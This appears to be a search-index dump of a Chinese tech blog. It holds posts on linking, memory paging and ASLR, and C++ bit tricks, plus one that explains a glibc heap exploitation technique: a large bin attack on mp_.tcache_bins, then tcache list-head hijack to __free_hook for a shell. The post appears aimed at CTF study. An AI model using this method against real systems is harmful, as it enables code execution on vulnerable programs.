如果两个目标文件能够相互链接，那么他们必须ABI（Application Binary Interface，程序二进制接口）兼容（采用相同的目标文件格式、拥有相同的符号修饰规则、内存分布方式相同、函数调用方式相同等）。\n由于C++的语言规定等，它的二进制兼容更为不易，因此大家都盼望着有统一的C++ ABI，但是目前来看问题将长久存在\n静态链接库 静态库可以被看作是一组目标文件的集合，比如我们的HelloWorld程序里面调用了printf函数，这就需要链接标准库。\n在C语言的运行库中存放了很多和系统功能相关的代码，这些代码非常繁杂，为了良好的组织，并且各目标文件中往往存在复杂的依赖关系，人们用ar程序将这些目标程序压缩在一起并为他们进行编号和索引方便查找与检索\n控制链接过程 使用ld script 我们可以通过向编译器传递命令行参数来控制链接，也可以将链接控制信息写在目标文件的段中（比如MSVC会将控制信息放在PE文件的.drectve段中），但有一种更为强大的方式，即使用ld script（MSVC使用.def模块定义文件）\n它可以控制程序入口、段名、是否丢弃段等\n具体写法见ld script 学习笔记_ioscoder的博客-CSDN博客\nMake、CMake控制生成与链接库 我们还可以通过一些更现代化的构建器脚本来控制生成与链接库，比如Make、CMake、XMake等，他们可以通过指定命令行参数来控制编译与链接过程（比如CMake中的add_compile_options命令），因而也可以单独写一个ld script，然后用这些构建工具传参给编译器进行更加底层的链接控制\nBFD库——文件抽象 因为现代硬件和平台种类繁多，因着架构等的不同，ELF在不同平台也有不同变种，这样对于分析程序来说极为不便，最好有一种统一的接口来处理这种差异，而BFD库就担任着这个大任。\nBFD库将文件抽象成一个统一的模型，里面包含了文件头、符号表、重定位表等概念，使用者只需要通过这些抽象的概念就能描述文件，而不用去管那些复杂细微的差异。\nBFD库是gnu binutils的子项目，可以在Binutils - GNU Project - Free Software Foundation找到，可以在Index of /gnu/binutils\n","date":"2023年03月01日","permalink":"https://peterliuzhi.top/principle/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"There are basically two types of people. People who accomplish things, and people who claim to have accomplished things. The first group is less crowded. — Mark Twain 本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (200","tags":["pwn","静态链接","底层原理"],"title":"静态链接_基础知识"},{"categories":["posts"],"contents":" Yesterday is history. Tomorrow is a mystery. And today? Today is a gift. That is why we call it the present. — Babatunde Olatunji\n引入 手写真值表极其繁琐又无聊，于是我想着能不能用C++生成一个可读性高的真值表\n使用了库GitHub - p-ranav/tabulate: Table Maker for Modern C++，这是一个header-only的库，源代码全部写在头文件里面，不用单独编译。\n具体的教程可以看下面两篇：\ntabulate/README.md at master · p-ranav/tabulate · GitHub 优雅地使用 C++ 制作表格：tabulate - 削微寒 - 博客园 总之只需要引入single_include/tabulate/tabulate.hpp就能直接用了\n具体代码 传入一个函数指针来表示逻辑函数，可以用make_basic_func来跳过一些繁琐的数据处理，直接写逻辑表达式：\n#include \u0026lt;functional\u0026gt; #include \u0026lt;initializer_list\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026#34;tabulate.hpp\u0026#34; typedef std::function\u0026lt;bool(uint64_t, char)\u0026gt; FUNC; typedef std::function\u0026lt;bool(std::vector\u0026lt;bool\u0026gt;)\u0026gt; BINARY_EXPRESSION; inline bool ImplicationForm(bool var1, bool var2) { return (!var1 || var2); } inline bool XNOR(bool var1, bool var2) { return !(var1 ^ var2); } inline bool EquivalentForm(bool var1, bool var2) { // 相当于同或 return XNOR(var1, var2); } inline bool NAND(bool var1, bool var2) { // 与非联结词 return !(var1 \u0026amp;\u0026amp; var2); } inline bool NOR(bool var1, bool var2) { // 或非联结词 return !(var1 || var2); } tabulate::Table func_to_truth_table(const std::initializer_list\u0026lt;FUNC\u0026gt;\u0026amp; func_list, const std::initializer_list\u0026lt;std::string\u0026gt;\u0026amp; vars) { const auto var_size = vars.end() - vars.begin(); if (var_size \u0026gt; 63) { std::cerr \u0026lt;\u0026lt; \u0026#34;无法处理超过63个变量！\u0026#34; \u0026lt;\u0026lt; std::endl; return tabulate::Table(); } tabulate::Table table; // 插入头部 tabulate::Table::Row_t header; header.insert(header.end(), vars.begin(), vars.end()); for (int i = 0; i \u0026lt; func_list.end() - func_list.begin(); i++) { header.push_back(\u0026#34;Result\u0026#34; + std::to_string(i)); } table.add_row(header); for (auto\u0026amp; cell : table[0]) { cell.format() .font_color(tabulate::Color::blue) .font_style({ tabulate::FontStyle::bold, tabulate::FontStyle::underline }) .font_align(tabulate::FontAlign::center); } uint64_t var_truth = 0; uint64_t max_size = (uint64_t)0x1 \u0026lt;\u0026lt; var_size; for (uint64_t i = 0; i \u0026lt; max_size; i++) { tabulate::Table::Row_t onerow; for (char j = (var_size - 1); j \u0026gt;= 0; j--) { onerow.push_back(std::to_string((var_truth \u0026gt;\u0026gt; j) \u0026amp; 0x1)); } for (auto\u0026amp; f : func_list) { onerow.push_back(std::to_string((int)f(var_truth, (char)var_size))); } ++var_truth; table.add_row(onerow); for (auto\u0026amp; cell : table[i + 1]) { cell.format() .font_align(tabulate::FontAlign::center); } } for (int i = 0; i \u0026lt; func_list.end() - func_list.begin(); i++) { for (auto\u0026amp; cell : table.column(var_size + i)) { cell.format() .font_style({ tabulate::FontStyle::bold }); } } return table; } tabulate::Table func_to_truth_table(const FUNC f, const std::initializer_list\u0026lt;std::string\u0026gt;\u0026amp; vars) { return func_to_truth_table({ f }, vars); } FUNC make_basic_func(BINARY_EXPRESSION f) { std::function\u0026lt;bool(uint64_t, char)\u0026gt; ret = [f](uint64_t truth, char length) -\u0026gt; bool { bool val = truth \u0026amp; 0x1; std::vector\u0026lt;bool\u0026gt; val_list; for (int i = length - 1; i \u0026gt;= 1; i--) { val_list.push_back((truth \u0026gt;\u0026gt; i) \u0026amp; 0x1); } val_list.push_back(val); return f(val_list); }; return ret; } int main(int argc, char const* argv[]) { // ∨∧→↔┐ std::cout \u0026lt;\u0026lt; \u0026#34;p ∧ r ∧ ┐(q → p):\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; func_to_truth_table(make_basic_func([](std::vector\u0026lt;bool\u0026gt; val_list) -\u0026gt; bool { return val_list[0] \u0026amp;\u0026amp; val_list[2] \u0026amp;\u0026amp; (!ImplicationForm(val_list[1], val_list[0])); }), { \u0026#34;p\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;r\u0026#34; }) \u0026lt;\u0026lt; std::endl; std::initializer_list\u0026lt;FUNC\u0026gt; func_list { make_basic_func([](std::vector\u0026lt;bool\u0026gt; val_list) -\u0026gt; bool { return val_list[0] \u0026amp;\u0026amp; val_list[2] \u0026amp;\u0026amp; (!ImplicationForm(val_list[1], val_list[0])); }), make_basic_func([](std::vector\u0026lt;bool\u0026gt; val_list) -\u0026gt; bool { return ImplicationForm(ImplicationForm(val_list[0], val_list[1]), ImplicationForm(!val_list[1], !val_list[0])) || val_list[2]; }), make_basic_func([](std::vector\u0026lt;bool\u0026gt; val_list) -\u0026gt; bool { return EquivalentForm(ImplicationForm(val_list[0], val_list[1]), ImplicationForm(val_list[0], val_list[2])); }) }; func_to_truth_table(func_list, { \u0026#34;p\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;r\u0026#34; }).print(std::cout); return 0; } 效果：\n不知道是什么原因，下划线和粗体在Windows上都无法生效（博主还没在Linux上测试过），但是效果海星（至少够用\n","date":"2023年03月01日","permalink":"https://peterliuzhi.top/posts/c++%E9%80%9A%E8%BF%87%E9%80%BB%E8%BE%91%E5%87%BD%E6%95%B0%E7%94%9F%E6%88%90%E7%9C%9F%E5%80%BC%E8%A1%A8/","section":"posts","summary":"Yesterday is history. Tomorrow is a mystery. And today? Today is a gift. That is why we call it the present. — Babatunde Olatunji 引入 手写真值表极其繁琐又无聊，于是我想着能不能用C++生成一个可读性高的真值表 使用了库GitHub - p-ranav/tabulate:","tags":["杂谈","C++","tabulate库"],"title":"C++通过逻辑函数生成真值表"},{"categories":["posts","C++"],"contents":" You give before you get. — Napoleon Hill\n打印整数 打印整数很简单，只需要位运算就好了。\n我使用了模板，这样就能针对不同长度的整数类型只用写一次代码：\ntemplate\u0026lt;typename T\u0026gt; void _inner_print_bin(T num, char length){ bool still_head = true; for (char i = length; i \u0026gt;= 0; i--) { char tmp = (num \u0026gt;\u0026gt; i) \u0026amp; 0x1; if ((still_head \u0026amp;\u0026amp; tmp) || !still_head) { std::cout \u0026lt;\u0026lt; (short)tmp ; still_head = false; } } std::cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } template\u0026lt;typename T\u0026gt; void printnum(T num){ std::ios::sync_with_stdio(false); _inner_print_bin(num, sizeof(T)*8-1); } 浮点数二进制打印 浮点数因为IEEE754的规定比较麻烦。\n整个浮点数分为sign（符号位）、exponent（指数）、mantissa（尾数）三部分组成\n具体来说，最后小数的真实值 = $(-1)^{sign}*2^{exponent}*mantissa$，知道这个，我们只需要使用掩码就能分别得到sign、exponent和mantissa，然后进行一定的运算就能得到小数的二进制表示：\ninline uint64_t mask_double_mantissa(uint64_t bits){ return (bits \u0026amp; 0xFFFFFFFFFFFFF) | ((uint64_t)0x1 \u0026lt;\u0026lt; 52); }; inline int64_t mask_double_exponent(uint64_t bits){ return ((int64_t)((bits \u0026gt;\u0026gt; 52) \u0026amp; 0x7FF)) - 1023; } inline char mask_double_sign(uint64_t bits){ return (bits \u0026gt;\u0026gt; 63) \u0026amp; 1; } inline uint32_t mask_float_mantissa(uint32_t bits){ return (bits \u0026amp; 0x7FFFFF) | (0x1 \u0026lt;\u0026lt; 23); }; inline int32_t mask_float_exponent(uint32_t bits){ return ((int32_t)((bits \u0026gt;\u0026gt; 23) \u0026amp; 0xFF)) - 127; } inline char mask_float_sign(uint32_t bits){ return (bits \u0026gt;\u0026gt; 31) \u0026amp; 1; } template\u0026lt;typename T1, typename T2\u0026gt; void _inner_print_bin(T1 num, T2 exp, char length){ bool still_head = true; char cnt = 0; for (char i = length; i \u0026gt;= 0; i--) { char tmp = (num \u0026gt;\u0026gt; i) \u0026amp; 0x1; if ((still_head \u0026amp;\u0026amp; tmp) || !still_head) { std::cout \u0026lt;\u0026lt; (short)tmp ; still_head = false; if (cnt == exp) std::cout \u0026lt;\u0026lt; \u0026#39;.\u0026#39;; ++cnt; } } std::cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } void printnum(double num){ std::ios::sync_with_stdio(false); uint64_t bits = *(uint64_t*)\u0026amp;num; char sign = mask_double_sign(bits); int64_t exp = mask_double_exponent(bits); uint64_t mantissa = mask_double_mantissa(bits); if (sign == 1){ std::cout \u0026lt;\u0026lt; \u0026#39;-\u0026#39;; } if (exp \u0026gt; 0){ _inner_print_bin(mantissa, exp, 63); }else{ std::cout \u0026lt;\u0026lt; \u0026#34;0.\u0026#34;; for (unsigned char i = 0; i \u0026lt; (-exp) - 1; i++) { std::cout \u0026lt;\u0026lt; \u0026#39;0\u0026#39;; } _inner_print_bin(mantissa, 63); } } void printnum(float num){ std::ios::sync_with_stdio(false); uint32_t bits = *(uint32_t*)\u0026amp;num; char sign = mask_float_sign(bits); int32_t exp = mask_float_exponent(bits); uint32_t mantissa = mask_float_mantissa(bits); if (sign == 1){ std::cout \u0026lt;\u0026lt; \u0026#39;-\u0026#39;; } if (exp \u0026gt; 0){ _inner_print_bin(mantissa, exp, 31); }else{ std::cout \u0026lt;\u0026lt; \u0026#34;0.\u0026#34;; for (unsigned char i = 0; i \u0026lt; (-exp) - 1; i++) { std::cout \u0026lt;\u0026lt; \u0026#39;0\u0026#39;; } _inner_print_bin(mantissa, 31); } } 注意，浮点数规定第一位必须是符号位，所以不能用unsigned修饰 虽然有些编译器会自动转换类型，有些编译器会抛出warning使得编译可以通过，但是这种写法是需要避免的\n完整代码： printnum.h：\n/* * @Author : PeterLiu-all peterliuforever@gmail.com * @Date : 2023-02-28T16:45:56+0800 * @LastEditTime : 2023-02-28T22:50:28+0800 * @LastEditors : PeterLiu-all peterliuforever@gmail.com * @FilePath : \\print_num\\libprintnum\\printnum.h * @Description : libprintnum头文件 */ #ifndef __LIBPRINTNUM_PRINTNUM_H__ #define __LIBPRINTNUM_PRINTNUM_H__ #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;iostream\u0026gt; constexpr uint64_t mask_double_mantissa(uint64_t bits){ return (bits \u0026amp; 0xFFFFFFFFFFFFF) | ((uint64_t)0x1 \u0026lt;\u0026lt; 52); }; constexpr int64_t mask_double_exponent(uint64_t bits){ return ((int64_t)((bits \u0026gt;\u0026gt; 52) \u0026amp; 0x7FF)) - 1023; } constexpr char mask_double_sign(uint64_t bits){ return (bits \u0026gt;\u0026gt; 63) \u0026amp; 1; } constexpr uint32_t mask_float_mantissa(uint32_t bits){ return (bits \u0026amp; 0x7FFFFF) | (0x1 \u0026lt;\u0026lt; 23); }; constexpr int32_t mask_float_exponent(uint32_t bits){ return ((int32_t)((bits \u0026gt;\u0026gt; 23) \u0026amp; 0xFF)) - 127; } constexpr char mask_float_sign(uint32_t bits){ return (bits \u0026gt;\u0026gt; 31) \u0026amp; 1; } template\u0026lt;typename T\u0026gt; void _inner_print_bin(T num, char length){ bool still_head = true; for (char i = length; i \u0026gt;= 0; i--) { char tmp = (num \u0026gt;\u0026gt; i) \u0026amp; 0x1; if ((still_head \u0026amp;\u0026amp; tmp) || !still_head) { std::cout \u0026lt;\u0026lt; (short)tmp ; still_head = false; } } std::cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } template\u0026lt;typename T1, typename T2\u0026gt; void _inner_print_bin(T1 num, T2 exp, char length){ bool still_head = true; char cnt = 0; for (char i = length; i \u0026gt;= 0; i--) { char tmp = (num \u0026gt;\u0026gt; i) \u0026amp; 0x1; if ((still_head \u0026amp;\u0026amp; tmp) || !still_head) { std::cout \u0026lt;\u0026lt; (short)tmp ; still_head = false; if (cnt == exp) std::cout \u0026lt;\u0026lt; \u0026#39;.\u0026#39;; ++cnt; } } std::cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } template\u0026lt;typename T\u0026gt; void printnum(T num){ std::ios::sync_with_stdio(false); _inner_print_bin(num, sizeof(T)*8-1); } // 注意，浮点数规定第一位必须是符号位，所以不能用unsigned修饰 // 虽然有些编译器会自动转换类型，有些编译器会抛出warning使得编译可以通过，但是这种写法是需要避免的 void printnum(double num); void printnum(float num); #endif /* __LIBPRINTNUM_PRINTNUM_H__ */ printnum.c：\n/* * @Author : PeterLiu-all peterliuforever@gmail.com * @Date : 2023-02-28T16:45:48+0800 * @LastEditTime : 2023-02-28T21:53:52+0800 * @LastEditors : PeterLiu-all peterliuforever@gmail.com * @FilePath : \\print_num\\libprintnum\\printnum.cpp * @Description : 模板全特化 */ #include \u0026#34;printnum.h\u0026#34; void printnum(double num){ std::ios::sync_with_stdio(false); uint64_t bits = *(uint64_t*)\u0026amp;num; char sign = mask_double_sign(bits); int64_t exp = mask_double_exponent(bits); uint64_t mantissa = mask_double_mantissa(bits); if (sign == 1){ std::cout \u0026lt;\u0026lt; \u0026#39;-\u0026#39;; } if (exp \u0026gt; 0){ _inner_print_bin(mantissa, exp, 63); }else{ std::cout \u0026lt;\u0026lt; \u0026#34;0.\u0026#34;; for (unsigned char i = 0; i \u0026lt; (-exp) - 1; i++) { std::cout \u0026lt;\u0026lt; \u0026#39;0\u0026#39;; } _inner_print_bin(mantissa, 63); } } void printnum(float num){ std::ios::sync_with_stdio(false); uint32_t bits = *(uint32_t*)\u0026amp;num; char sign = mask_float_sign(bits); int32_t exp = mask_float_exponent(bits); uint32_t mantissa = mask_float_mantissa(bits); if (sign == 1){ std::cout \u0026lt;\u0026lt; \u0026#39;-\u0026#39;; } if (exp \u0026gt; 0){ _inner_print_bin(mantissa, exp, 31); }else{ std::cout \u0026lt;\u0026lt; \u0026#34;0.\u0026#34;; for (unsigned char i = 0; i \u0026lt; (-exp) - 1; i++) { std::cout \u0026lt;\u0026lt; \u0026#39;0\u0026#39;; } _inner_print_bin(mantissa, 31); } } ","date":"2023年02月28日","permalink":"https://peterliuzhi.top/posts/c++%E6%89%93%E5%8D%B0%E6%95%B4%E6%95%B0%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6/","section":"posts","summary":"You give before you get. — Napoleon Hill 打印整数 打印整数很简单，只需要位运算就好了。 我使用了模板，这样就能针对不同长度的整数类型只用写一次代码： template\u0026lt;typename T\u0026gt; void _inner_print_bin(T num, char length){ bool still_head = true; for (char i =","tags":["杂谈","C++","底层原理"],"title":"C++打印整数、浮点数的二进制"},{"categories":["principle","底层架构"],"contents":" Always remember that you are absolutely unique. Just like everyone else. — Margaret Mead\n直接跑在物理地址 一开始人们将程序直接跑在物理地址上，但这样会出现几个问题：\n地址空间和其他程序不隔离。 想象一下，如果你同时在跑两个不相干的程序，因为其中一个程序溢出了自己的地址空间而干扰到另外一个程序，导致这个程序崩溃…… 内存使用效率低。 当计算机运行时，某个时间段内，它只是使用了一小部分的数据。其他数据在一个时间段内并不会被使用。而此时如果我们忽然需要运行一个新的程序，而此时内存空间不够，那我们要先将原来的程序写入磁盘，等到新程序运行完才能重新读回内存，这种频繁的IO操作极度浪费资源。（还有内存碎片的问题） 程序运行的地址不确定。 因为程序是直接跑在物理地址上的，而物理地址具有唯一性，那么就很难保证程序运行的时候地址是确定的。这就会对重定向造成很大的麻烦，静态链接的程序需要在程序每次运行时都根据程序当前运行的地址重新进行重定向，这简直是不可理喻的。 虚拟地址 既然不能跑在物理地址上，那我们可不可以将每次都不同的物理地址映射成一个确定的虚拟地址？比如一个程序的基址是0x84000，每次将这个程序装载入内存的时候就将分配到的物理地址映射成这个地址，然后程序就跑在这个虚拟地址上，通过一个映射和物理地址通信。\n古早的分段 因为有了虚拟地址的想法，所以人们自然而然地想到将物理地址分成一段一段不同大小的映射成虚拟地址。\n这种想法和直接跑在物理地址上的想法差别不大，只是进行了地址空间的隔离与确定。\n这样就可以解决之前提出的1、3两个问题。\n因为地址是虚拟的，所以操作系统可以监控这一段虚拟地址，一旦访问超出了虚拟地址空间，硬件就判定程序产生了非法的访问，并将其上报给操作系统或者监控程序，由它来判决。 同时，因为地址是虚拟的，所以地址可以一直确定。（现在有些程序会使用PIE（Position-Independent Executable，位置无关可执行文件）让程序每次运行的基址都不一样来保护程序，但是这样必然会影响到程序的效率，因此一般只有一些安全性要求比较高的程序使用（但是gcc是默认有PIE的）） 但是分段没有办法解决第二个问题，因为它本质上还是跑在物理地址上，只是对地址进行了处理。\n分页 因此，人们想出了一种粒度更高的内存分割和映射方法——分页。\n分页的思想是指把地址空间人为地分成大小相等的若干份，一份称为一页，就像一本书由很多页面组成，每个页面大小相等。也就是说内存条可以看为一本书，里面的物理内存被分为一页一页来管理，以页为单位对内存进行换入换出。即：\n当程序运行时，只需要将必要的数据从磁盘读取到内存，暂时用不到的数据先留在磁盘中，什么时候用到什么时候读取。 当物理内存不足时，只需要将原来程序的部分数据写入磁盘，腾出足够的空间即可，不用把整个程序都写入磁盘。 （上面的内容来自计算机内存的分页机制_一颗日成的博客-CSDN博客）\n（DP = Disk Page, VP = Virtual Page, PP = Physical Page）\n对于现代操作系统来说，页的大小一般是4KB（比如 Intel Pentium 系列处理器支持 4KB 或 4MB 的页大小，那么操作系统可以选择每页大小为 4KB，也可以选择每页大小为 4MB，但是在同一时刻只能选择一种大小，所以对整个系统来说，也就是固定大小的。），这也是pwn中libc基址最后三位不变的原因。\n程序的分段 在一个程序的虚拟空间之中，由于我们需要实现数据与指令等的隔离，所以我们仍然需要进行分段（分段的目的是为了更好地满足用户的需要）\n比如，在ELF中，我们会将程序分为text段、data段等，然后每个段再分为不同的节，如.text节、.rodata节、.bss节等，操作系统为他们分配了不同的rwx权限（读、写、可执行），且只有操作系统可以更改。具体可以看我博客的这篇文章ELF详解 - P3troL1er 的个人博客\n有一些段是在编译链接期间就确定好的，有一些段，比如堆、栈是在装载的时候才确定的，宏观地看，整个虚拟空间长这样：\n（图片来源：堆概述 - CTF Wiki）\n一般来说，操作系统会使用ASLR（Address Space Layout Randomization，地址空间布局随机化）对堆、栈等在装载期间确定地址的段进行随机化保护，如上图中栈和堆的随机偏移量（Random offset）\n不同的ASLR等级保护也不同，它常常会和PIE一起实现随机化：\nASLR Executable PLT Heap Stack Shared libraries 0 × × × × × 1 × × × √ √ 2 × × √ √ √ 2+PIE √ √ √ √ √ Linux下可以通过更改/proc/sys/kernel/randomize_va_space来设置ASLR等级\n","date":"2023年02月23日","permalink":"https://peterliuzhi.top/principle/%E5%88%86%E9%A1%B5%E5%88%86%E6%AE%B5%E5%92%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"Always remember that you are absolutely unique. Just like everyone else. — Margaret Mead 直接跑在物理地址 一开始人们将程序直接跑在物理地址上，但这样会出现几个问题： 地址空间和其他程序不隔离。 想象一下，如果你同时在","tags":["pwn"],"title":"分页、分段和虚拟地址_基础知识"},{"categories":["principle"],"contents":" It\u0026rsquo;s not what you look at that matters, it\u0026rsquo;s what you see. — Henry David Thoreau\n什么是mp_结构体？ 我们可以在identifier - Glibc source code (glibc-2.37) - Bootlin搜索mp_，会发现它是一个内部链接的全局变量，类型是malloc_par结构体：\n这说明它不会出现在libc的符号表中，需要通过gdb调试获取偏移：\n而通过它的名字和赋值我们也可以很清晰地猜测到，这个tcache_bins域是用来记录tcache bin的最大索引值的，超过这个索引值的堆块都不属于tcache bin。\n这个索引值是通过堆块的大小计算的。之所以要计算这个索引值，是因为所有的bin存在一个大小为136的数组里面，tcache bin、large bin等都管理一定范围内的bin。通过大小计算这个索引可以很方便地判断一个堆块应属哪个bin\nmp_.tcache_bins有什么用？ 那么这个mp_.tcache_bins有什么用呢？\n可以看到，如果我们想要伪造一个大chunk，让它以tcache的方式被获取（这样就可以使用与tcache相关的攻击手段攻击），我们需要伪造以下两个值：\nmp_.tcache_bins足够大。可以通过unsorted bin attack（高版本不可用）或者large bin attack等方式向mp_.tcache_bins内写入一个足够大的值实现 tcache-\u0026gt;counts[tc_idx] \u0026gt; 0。 第二点如何实现呢？我们如何更改这个counts值呢？\n因为tcache结构体是存放在堆上的（通常是第一个堆块），当然可以使用其他方式覆写counts值，但在这里其实可以利用tcache bin本身的漏洞。\n当mp_.tcache_bins足够大的时候，我们是可以将一个大chunk放进tcache bin中的，只是由于tcache分配在堆上，这个索引值又太大，所以这个大chunk的地址（链表头）会被放进相邻的chunk中\n同时，tcache_get里也没有对越界的检查：\nPS. 其中，if (__glibc_unlikely (!aligned_OK (e)))malloc_printerr (\u0026quot;malloc(): unaligned tcache chunk detected\u0026quot;);这段代码的作用是检查从tcache中获取的内存块的地址是否按照指定的对齐方式对齐（__glibc_unlikely用于编译器优化），这些都和越界无关\n同时，tcache_put也允许我们放入一个大chunk，甚至链表头都是不加密的\n因此，如果我们可以控制相邻堆块，那么我们释放的大堆块所属的链表头也是可控的。\n具体应该如何操作？ 以上这一通操作能够实现的前提是mp_.tcache_bins通过unsorted bin attack或者large bin attack等方式增大\nmp_.tcache_bins = mp_ + 0x50 = mp_ + 80，如果用large bin attack覆写，要写入的地址是mp_ + 0x30。large bin attack的具体解析见我的另一篇文章Largebin_Attack - P3troL1er 的个人博客\n然后我们要释放一个大小为N的大堆块p1进入tcache bin，然后记下它的地址（可以通过下断点到free那里查看，也可以通过heap等命令查看堆分布获取）\n然后通过x/150gx或者tele命令找到这个地址存放的位置和我们可控的相邻chunk头部的差值\n这里感谢群里L0tus和h4kuy4等师傅的耐心指导，这三张图也是来自他们~\n然后我们就可以将链表头地址覆盖为__free_hook等，实现getshell。\n如果有什么问题或者建议，欢迎在评论区评论指出~\n","date":"2023年02月23日","permalink":"https://peterliuzhi.top/principle/mp_.tcache_bins%E5%9F%BA%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","section":"principle","summary":"It\u0026rsquo;s not what you look at that matters, it\u0026rsquo;s what you see. — Henry David Thoreau 什么是mp_结构体？ 我们可以在identifier - Glibc source code (glibc-2.37) - Bootlin搜索mp_，会发现它是一个内部链接的全局变","tags":["pwn","mp_.tcache_bins"],"title":"mp_.tcache_bins基本漏洞利用"},{"categories":["posts"],"contents":" Always tell the truth. That way, you don\u0026rsquo;t have to remember what you said. — Mark Twain\n最近在上数字逻辑，想起以前做过的一道算法题（不用加法符实现两数相加），突发奇想想要纯用位运算实现一下加减乘除模\n以前最多实现加减乘，对除法一直没想到纯粹位运算的方式，今天算是“圆梦”了\n注意，我写的这几个函数只能用于整数（包括int、long、long long还有他们的unsigned形式），使用C++主要是可以使用模板实现泛型，如果纯用C可能就需要转成void*之类的比较复杂的操作（或者使用宏中的##连接符实现重载）\n下面是具体的代码，如果您发现了bug可以在下面的评论告诉我~\ntemplate \u0026lt;typename NUM\u0026gt; NUM add(NUM a, NUM b){ while (b != 0) { // 筛选出a中位为1的同时b中位为1，然后左移一位当作进位 NUM tmp = (a \u0026amp; b) \u0026lt;\u0026lt; 1; a ^= b; b = tmp; } return a; } template \u0026lt;typename NUM\u0026gt; NUM minus(NUM a, NUM b){ while (b != 0) { // 筛选出a中位为0的同时b中位为1，然后左移一位当作进位 NUM tmp = ((~a) \u0026amp; b) \u0026lt;\u0026lt; 1; a ^= b; b = tmp; } return a; } template \u0026lt;typename NUM\u0026gt; NUM multiply(NUM a, NUM b){ bool sign = false; if (a \u0026lt; 0) { sign = !sign; a = add(~a, 1); } if (b \u0026lt; 0) { sign = !sign; b = add(~b, 1); } // 有一个等于0直接返回 if (a == 0 || b == 0) { return 0; } NUM sum = 0; // 记录结果 char cnt = 0; // 记录左移多少位 while (b != 0) { // 如果这位是1，就要将a左移cnt位并加上 if (b \u0026amp; 0x1) { sum = add(sum, a \u0026lt;\u0026lt; cnt); } b \u0026gt;\u0026gt;= 1; ++cnt; } // 处理符号 if (sign) { return add(~sum, 1); }else { return sum; } } template \u0026lt;typename NUM\u0026gt; NUM* basic_divide(NUM a, NUM b, NUM* ret){ if (a == 0) { ret[0] = 0; ret[1] = 0; return ret; }else if (b == 0) { ret[0] = a; ret[1] = 0; std::cerr \u0026lt;\u0026lt; \u0026#34;dividing 0!\\n\u0026#34;; return ret; } bool sign = false; if (a \u0026lt; 0) { sign = !sign; a = add(~a, 1); } if (b \u0026lt; 0) { sign = !sign; b = add(~b, 1); } NUM result = 0; NUM max = b; char cnt = 1; while ((b \u0026lt;\u0026lt; 1) \u0026lt; a) { b \u0026lt;\u0026lt;= 1; ++cnt; } while (cnt \u0026gt; 0) { if (a \u0026gt;= b) { a = minus(a, b); result = (result \u0026lt;\u0026lt; 1) ^ 0x1; }else { result \u0026lt;\u0026lt;= 1; } b \u0026gt;\u0026gt;= 1; --cnt; } if (sign) { ret[0] = add(~result, 1); ret[1] = add(~a, 1); }else { ret[0] = result; ret[1] = a; } return ret; } template \u0026lt;typename NUM\u0026gt; NUM divide(NUM a, NUM b){ NUM result[2] {0}; return basic_divide(a, b, result)[0]; } template \u0026lt;typename NUM\u0026gt; NUM mod(NUM a, NUM b){ NUM result[2] {0}; return basic_divide(a, b, result)[1]; } 由于模板函数的定义和声明不能分开，所以这些代码都得放在头文件中，当然也可以放在cpp文件中然后在头文件包含它：\n#ifndef __ARITH_ARITH_H__ #define __ARITH_ARITH_H__ #include \u0026#34;arith.cpp\u0026#34; #endif /* __ARITH_ARITH_H__ */ 加法的思路就是用且运算获取同为1的位，然后左移一位作为进位，一直while循环直到进位为0\n减法的思路就是用复杂的位运算获取被减数为0而减数为1的位，然后左移一位作为借位，一直while循环直到借位为0\n乘法的思路就是将其中一个乘数看作数个权值的和，比如3 = 0b11 = 2^0 + 2^1，而一个数乘以2的n次方可以看作向左移动n位，然后将他们全部加起来就是结果了（乘法很可能溢出……在汇编中mul指令会把结果放在两个寄存器中，我比较懒，这么搞比较复杂，就没有搞）\n除法的思路就是左移除数让其刚好再移一位就大于被除数，然后被除数减去它，并在结果推进一个1，这时候被除数的总位数一定会少一位（因为除数*2 \u0026gt; 被除数，那么被除数 - 除数一定会小于被除数 \u0026raquo; 1），然后让除数右移一位，如果此时被除数小于除数，就在结果推进一个0，然后再右移除数……本质上是模拟竖式除法运算。这个思路可以一次性得出结果和余数。\n笔者的思路可能不是最高效的，也可能有一定问题，如果您读完本文及代码，有一些疑问或建议，欢迎在评论区指出！谢谢！\n","date":"2023年02月21日","permalink":"https://peterliuzhi.top/posts/%E6%95%B4%E6%B4%BBc++%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%A8%A1%E8%BF%90%E7%AE%97%E7%AC%A6%E5%AE%9E%E7%8E%B0%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%A8%A1/","section":"posts","summary":"Always tell the truth. That way, you don\u0026rsquo;t have to remember what you said. — Mark Twain 最近在上数字逻辑，想起以前做过的一道算法题（不用加法符实现两数相加），突发奇想想要纯用位运算实现一下加减乘除模 以前最","tags":["杂谈","C++","算数"],"title":"【整活】C++不用加减乘除模运算符实现加减乘除模"},{"categories":["principle"],"contents":" When you begin to touch your heart or let your heart be touched, you begin to discover that it\u0026rsquo;s bottomless. — Pema Chödrön\nLarge bin的数据结构 何时会进入large bin中？ Large bin用来储存释放掉的大chunk。\n当释放一个大chunk的时候，会先进入unsorted bin。 当程序开始从unsorted bin中查找chunk的时候 如果查找到的chunk的大小不等于要申请的chunk的大小（chunk size != nb），就判定为不符合条件的chunk，根据它的大小将其放进small bin或者large bin中。 如果查找到的chunk的大小等于要申请的chunk的大小（chunk size == 